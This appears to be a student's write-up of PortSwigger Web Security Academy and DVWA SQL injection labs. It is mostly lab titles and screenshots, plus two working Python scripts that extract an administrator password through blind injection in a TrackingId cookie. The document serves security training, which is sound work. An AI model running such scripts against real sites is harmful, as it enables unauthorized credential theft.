# SQL Injection

Ten PortSwigger Web Security Academy labs plus DVWA practice covering SQL injection end to end: extracting hidden data through the WHERE clause, login bypass, fingerprinting the database type and version on Oracle and MySQL, listing database contents, and UNION attacks to pull data from other tables.

Tools: Burp Suite, PortSwigger Web Security Academy labs. Each lab below is documented with screenshots of the working exploit.

---

## Lab walkthroughs

SQl i  
DVWA

Low

![Lab screenshot](image1.png)

med

![Lab screenshot](image2.png)

**Lab: SQL injection vulnerability in WHERE clause allowing retrieval of
hidden data**

![Lab screenshot](image3.png)

**Lab: SQL injection vulnerability allowing login bypass**

![Lab screenshot](image4.png)![Lab screenshot](image5.png)

**Lab: SQL injection attack, querying the database type and version on
Oracle**

![Lab screenshot](image6.png)![Lab screenshot](image7.png)

**Lab: SQL injection attack, querying the database type and version on
MySQL and Microsoft**

![Lab screenshot](image8.png)

**Lab: SQL injection attack, listing the database contents on non-Oracle
databases**

![Lab screenshot](image9.png)![Lab screenshot](image10.png)![Lab screenshot](image11.png)![Lab screenshot](image12.png)

**  
**

**Lab: SQL injection attack, listing the database contents on Oracle**

**  
**

**Lab: SQL injection UNION attack, determining the number of columns
returned by the query**

![Lab screenshot](image13.png)![Lab screenshot](image14.png)

![Lab screenshot](image15.png)

**Lab: SQL injection UNION attack, finding a column containing text**

![Lab screenshot](image16.png)![Lab screenshot](image17.png)![Lab screenshot](image18.png)![Lab screenshot](image19.png)

**Lab: SQL injection UNION attack, retrieving data from other tables**

![Lab screenshot](image20.png)![Lab screenshot](image21.png)

**Lab: SQL injection UNION attack, retrieving multiple values in a
single column**

![Lab screenshot](image22.png)

![Lab screenshot](image23.png)

LAB: Blind SQL injection with conditional responses

My script

import requests

import string

url =
"https://0abd00ac038c15e380e1eded00260065.web-security-academy.net/filter?category=Pets"

headers = {

"User-Agent": "Mozilla/5.0 (X11; Linux x86\_64; rv:128.0) Gecko/20100101
Firefox/128.0"

}

charset = string.ascii\_lowercase + string.digits

print("Checking password length...")

password\_length = 0

for i in range(1, 21):

cookies = {

"TrackingId": f"03YGm5EbYT1nF7KQ' AND (SELECT LENGTH(password) FROM
users WHERE username='administrator') = {i} --",

"session": "WVR4cQBEWVgnDajP4x4TfFspY2U9DLaX"

}

response = requests.get(url, headers=headers, cookies=cookies)

if "Welcome back\!" in response.text:

password\_length = i

print(f"Password length found: {password\_length}")

break

print("Extracting password...")

password = ""

for i in range(1, password\_length + 1):

for char in charset:

cookies = {

"TrackingId": f"03YGm5EbYT1nF7KQ' AND SUBSTRING((SELECT password FROM
users WHERE username='administrator'), {i}, 1) = '{char}' --",

"session": "WVR4cQBEWVgnDajP4x4TfFspY2U9DLaX"

}

response = requests.get(url, headers=headers, cookies=cookies)

if "Welcome back\!" in response.text:

password += char

print(f"Found character {i}: {char}")

break

print(f"Extracted password: {password}")

![Lab screenshot](image24.png)![Lab screenshot](image25.png)![Lab screenshot](image26.png)![Lab screenshot](image27.png)![Lab screenshot](image28.png)

LAB: Blind SQL injection with conditional errors

My script

import requests

import string

burp0\_url =
"https://0a64001703dd26958388876e00cb007e.web-security-academy.net/filter?category=Pets"

burp0\_headers = {

"User-Agent": "Mozilla/5.0 (X11; Linux x86\_64; rv:128.0) Gecko/20100101
Firefox/128.0",

"Accept":
"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,\*/\*;q=0.8",

"Accept-Language": "en-US,en;q=0.5",

"Accept-Encoding": "gzip, deflate, br",

"Referer":
"https://0a64001703dd26958388876e00cb007e.web-security-academy.net/",

"Upgrade-Insecure-Requests": "1",

"Sec-Fetch-Dest": "document",

"Sec-Fetch-Mode": "navigate",

"Sec-Fetch-Site": "same-origin",

"Sec-Fetch-User": "?1",

"Priority": "u=0, i",

"Te": "trailers"

}

print("Retrieving Administrator Password Length...")

password\_length = 0

for i in range(0, 30):

burp0\_cookies = {

"TrackingId": f"nQ4zkIFwVshs3jjS'||(SELECT CASE WHEN LENGTH(password) \>
{i} THEN TO\_CHAR(1/0) ELSE '' END FROM users WHERE
username='administrator')||'--",

"session": "amGp8yGGcmZYh7kWeEEVNGYzHh5OLtFM"

}

response = requests.get(burp0\_url, headers=burp0\_headers,
cookies=burp0\_cookies)

if response.status\_code == 200:

password\_length = i

print(f"Password length found: {password\_length}")

break

print("\\nExtracting Password...")

password = ""

charset = string.ascii\_lowercase + string.digits

for i in range(1, password\_length + 1):

for char in charset:

burp0\_cookies = {

"TrackingId": f"nQ4zkIFwVshs3jjS'||(SELECT CASE WHEN substr(password,
{i}, 1) = '{char}' THEN TO\_CHAR(1/0) ELSE '' END FROM users WHERE
username='administrator')||'--",

"session": "amGp8yGGcmZYh7kWeEEVNGYzHh5OLtFM"

}

response = requests.get(burp0\_url, headers=burp0\_headers,
cookies=burp0\_cookies)

if response.status\_code == 500:

password += char

print(f"Found character {i}: {char}")

break

print(f"\\nExtracted password: {password}")

![Lab screenshot](image29.png)![Lab screenshot](image30.png)

LAB: Visible error-based SQL injection

![Lab screenshot](image31.png)![Lab screenshot](image32.png)![Lab screenshot](image33.png)

LAB: Blind SQL injection with time delays

![Lab screenshot](image34.png)![Lab screenshot](image35.png)
